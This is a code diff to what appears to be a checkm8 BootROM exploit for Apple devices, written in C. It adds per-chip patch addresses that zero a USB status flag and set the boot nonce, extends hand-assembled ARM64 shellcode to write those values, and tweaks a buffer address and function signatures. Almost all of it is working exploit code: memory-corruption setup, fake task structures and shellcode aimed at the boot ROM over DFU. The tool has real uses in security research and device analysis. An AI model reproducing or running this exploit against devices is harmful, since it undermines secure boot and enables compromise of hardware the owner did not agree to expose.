@@ -11,23 +11,35 @@
 #	define PATCH_ADDR_1 (0x1000078C0)
 #	define PATCH_ADDR_2 (0x1000078E4)
 #	define PATCH_ADDR_3 (0x100007BAC)
+#	define PATCH_ADDR_4 (0x1800888C4)
+#	define PATCH_ADDR_5 (0x20E029038)
+#	define PATCH_ADDR_6 (0x20E02903C)
 #	define PATCH_VAL_0 (0xD503201F) /* nop */
 #	define PATCH_VAL_1 (0xD503201F) /* nop */
 #	define PATCH_VAL_2 (0xD503201F) /* nop */
 #	define PATCH_VAL_3 (0xD503201F) /* nop */
+#	define PATCH_VAL_4 (0x00000000) /* gUSBMoreOtherStatus */
+#	define PATCH_VAL_5 (0xB4B4B4B4) /* Boot Nonce 0 */
+#	define PATCH_VAL_6 (0xB4B4B4B4) /* Boot Nonce 1 */
 #elif CPID == 0x7001
 #	define SYNOPSYS_ROUTINE_ADDR (0x1000064FC)
 #	define ARCH_TASK_TRAMP_ADDR (0x100010988)
-#	define IO_BUFFER_ADDR (0x18010D300)
+#	define IO_BUFFER_ADDR (0x18010D500)
 #	define SRTG "iBoot-1991.0.0.2.16"
 #	define PATCH_ADDR_0 (0x10000A714)
 #	define PATCH_ADDR_1 (0x10000A720)
 #	define PATCH_ADDR_2 (0x10000A744)
 #	define PATCH_ADDR_3 (0x10000AA08)
+#	define PATCH_ADDR_4 (0x180088E44)
+#	define PATCH_ADDR_5 (0x20E029038)
+#	define PATCH_ADDR_6 (0x20E02903C)
 #	define PATCH_VAL_0 (0xD503201F) /* nop */
 #	define PATCH_VAL_1 (0xD503201F) /* nop */
 #	define PATCH_VAL_2 (0xD503201F) /* nop */
 #	define PATCH_VAL_3 (0xD503201F) /* nop */
+#	define PATCH_VAL_4 (0x00000000) /* gUSBMoreOtherStatus */
+#	define PATCH_VAL_5 (0xB4B4B4B4) /* Boot Nonce 0 */
+#	define PATCH_VAL_6 (0xB4B4B4B4) /* Boot Nonce 1 */
 #elif CPID == 0x8000 || CPID == 0x8003
 #	define SYNOPSYS_ROUTINE_ADDR (0x100006718)
 #	define VROM_PAGE_TABLE_ADDR (0x1800C8400)
@@ -42,10 +54,16 @@
 #	define PATCH_ADDR_1 (0x10000792C)
 #	define PATCH_ADDR_2 (0x100007958)
 #	define PATCH_ADDR_3 (0x100007C9C)
+#	define PATCH_ADDR_4 (0x180087954)
+#	define PATCH_ADDR_5 (0x20E0B8038)
+#	define PATCH_ADDR_6 (0x20E0B803C)
 #	define PATCH_VAL_0 (0xD503201F) /* nop */
 #	define PATCH_VAL_1 (0xD503201F) /* nop */
 #	define PATCH_VAL_2 (0xD503201F) /* nop */
 #	define PATCH_VAL_3 (0xD503201F) /* nop */
+#	define PATCH_VAL_4 (0x00000000) /* gUSBMoreOtherStatus */
+#	define PATCH_VAL_5 (0xB4B4B4B4) /* Boot Nonce 0 */
+#	define PATCH_VAL_6 (0xB4B4B4B4) /* Boot Nonce 1 */
 #endif
 
 #define MAGIC (0xB4)
@@ -175,7 +193,7 @@ query_usb_interface(io_service_t serv, CFUUIDRef plugin_type, CFUUIDRef interfac
 }
 
 static void
-close_usb_device(handle_t *handle) {
+close_usb_device(const handle_t *handle) {
 	CFRunLoopRemoveSource(CFRunLoopGetCurrent(), handle->async_event_source, kCFRunLoopDefaultMode);
 	CFRelease(handle->async_event_source);
 	(*handle->device)->USBDeviceClose(handle->device);
@@ -198,7 +216,7 @@ open_usb_device(io_service_t serv, handle_t *handle) {
 }
 
 static kern_return_t
-send_usb_device_request(handle_t *handle, UInt8 bm_request_type, UInt8 b_request, UInt16 w_value, UInt16 w_index, void *p_data, UInt16 w_length) {
+send_usb_device_request(const handle_t *handle, UInt8 bm_request_type, UInt8 b_request, UInt16 w_value, UInt16 w_index, void *p_data, UInt16 w_length) {
 	IOUSBDevRequest req;
 
 	req.wLenDone = 0;
@@ -224,7 +242,7 @@ usb_async_cb(void *refcon, kern_return_t ret, void *arg_0) {
 }
 
 static kern_return_t
-send_usb_device_request_async(handle_t *handle, UInt8 bm_request_type, UInt8 b_request, UInt16 w_value, UInt16 w_index, void *p_data, UInt16 w_length, transfer_t *transfer) {
+send_usb_device_request_async(const handle_t *handle, UInt8 bm_request_type, UInt8 b_request, UInt16 w_value, UInt16 w_index, void *p_data, UInt16 w_length, transfer_t *transfer) {
 	IOUSBDevRequest req;
 
 	req.wLenDone = 0;
@@ -238,7 +256,7 @@ send_usb_device_request_async(handle_t *handle, UInt8 bm_request_type, UInt8 b_r
 }
 
 static kern_return_t
-dfu_check_status(handle_t *handle, UInt8 status, UInt8 state) {
+dfu_check_status(const handle_t *handle, UInt8 status, UInt8 state) {
 	dfu_status_t dfu_status;
 
 	if(send_usb_device_request(handle, USBmakebmRequestType(kUSBIn, kUSBClass, kUSBInterface), DFU_GET_STATUS, 0, 0, &dfu_status, sizeof(dfu_status)) == KERN_SUCCESS && dfu_status.status == status && dfu_status.state == state) {
@@ -248,7 +266,7 @@ dfu_check_status(handle_t *handle, UInt8 status, UInt8 state) {
 }
 
 static kern_return_t
-dfu_set_state_wait_reset(handle_t *handle) {
+dfu_set_state_wait_reset(const handle_t *handle) {
 	if(send_usb_device_request(handle, USBmakebmRequestType(kUSBOut, kUSBClass, kUSBInterface), DFU_DNLOAD, 0, 0, NULL, 0) == KERN_SUCCESS && dfu_check_status(handle, DFU_STATUS_OK, DFU_STATE_MANIFEST_SYNC) == KERN_SUCCESS && dfu_check_status(handle, DFU_STATUS_OK, DFU_STATE_MANIFEST) == KERN_SUCCESS) {
 		return dfu_check_status(handle, DFU_STATUS_OK, DFU_STATE_MANIFEST_WAIT_RESET);
 	}
@@ -256,7 +274,7 @@ dfu_set_state_wait_reset(handle_t *handle) {
 }
 
 static kern_return_t
-checkm8_stage_reset(handle_t *handle) {
+checkm8_stage_reset(const handle_t *handle) {
 	UInt8 data[EP0_MAX_PACKET_SZ];
 
 	memset(data, MAGIC, sizeof(data));
@@ -268,7 +286,7 @@ checkm8_stage_reset(handle_t *handle) {
 }
 
 static kern_return_t
-checkm8_stage_setup(handle_t *handle) {
+checkm8_stage_setup(const handle_t *handle) {
 	dfu_overwrite_t overwrite;
 	transfer_t transfer;
 
@@ -289,7 +307,7 @@ checkm8_stage_setup(handle_t *handle) {
 }
 
 static kern_return_t
-checkm8_stage_patch(handle_t *handle) {
+checkm8_stage_patch(const handle_t *handle) {
 	dfu_overwrite_t overwrite;
 	UInt32 *shc;
 
@@ -323,9 +341,9 @@ checkm8_stage_patch(handle_t *handle) {
 	*shc++ = 0xD50E871F; /* tlbi alle3 */
 	*shc++ = 0xD5033F9F; /* dsb sy */
 	*shc++ = 0xD5033FDF; /* isb */
-	*shc++ = 0x10000268; /* adr x8, #0x4C */
+	*shc++ = 0x10000328; /* adr x8, #0x64 */
 #else
-	*shc++ = 0x10000148; /* adr x8, #0x28 */
+	*shc++ = 0x10000208; /* adr x8, #0x40 */
 #endif
 	*shc++ = 0xB8404509; /* ldr w9, [x8], #4 */
 	*shc++ = 0xB9000269; /* str w9, [x19] */
@@ -333,8 +351,14 @@ checkm8_stage_patch(handle_t *handle) {
 	*shc++ = 0xB9000289; /* str w9, [x20] */
 	*shc++ = 0xB8404509; /* ldr w9, [x8], #4 */
 	*shc++ = 0xB90002A9; /* str w9, [x21] */
-	*shc++ = 0xB9400109; /* ldr w9, [x8] */
+	*shc++ = 0xB8404509; /* ldr w9, [x8], #4 */
 	*shc++ = 0xB90002C9; /* str w9, [x22] */
+	*shc++ = 0xB8404509; /* ldr w9, [x8], #4 */
+	*shc++ = 0xB90002E9; /* str w9, [x23] */
+	*shc++ = 0xB8404509; /* ldr w9, [x8], #4 */
+	*shc++ = 0xB9000309; /* str w9, [x24] */
+	*shc++ = 0xB9400109; /* ldr w9, [x8] */
+	*shc++ = 0xB9000329; /* str w9, [x25] */
 #if CPID == 0x8000 || CPID == 0x8003
 	*shc++ = 0x9249F54A; /* bic x10, x10, #(ARM_TTE_BLOCK_PNX | ARM_TTE_BLOCK_NX) */
 	*shc++ = 0xB279014A; /* orr x10, x10, #ARM_TTE_BLOCK_AP_PRIV */
@@ -350,11 +374,17 @@ checkm8_stage_patch(handle_t *handle) {
 	*shc++ = PATCH_VAL_0;
 	*shc++ = PATCH_VAL_1;
 	*shc++ = PATCH_VAL_2;
-	*shc = PATCH_VAL_3;
+	*shc++ = PATCH_VAL_3;
+	*shc++ = PATCH_VAL_4;
+	*shc++ = PATCH_VAL_5;
+	*shc = PATCH_VAL_6;
 	overwrite.fake_task.arch.x[19] = PATCH_ADDR_0;
 	overwrite.fake_task.arch.x[20] = PATCH_ADDR_1;
 	overwrite.fake_task.arch.x[21] = PATCH_ADDR_2;
 	overwrite.fake_task.arch.x[22] = PATCH_ADDR_3;
+	overwrite.fake_task.arch.x[23] = PATCH_ADDR_4;
+	overwrite.fake_task.arch.x[24] = PATCH_ADDR_5;
+	overwrite.fake_task.arch.x[25] = PATCH_ADDR_6;
 	overwrite.fake_task.magic_0 = TASK_STACK_MAGIC;
 	overwrite.fake_task.arch.lr = ARCH_TASK_TRAMP_ADDR;
 	overwrite.fake_task.stack_len = overwrite.synopsys_task.stack_len;
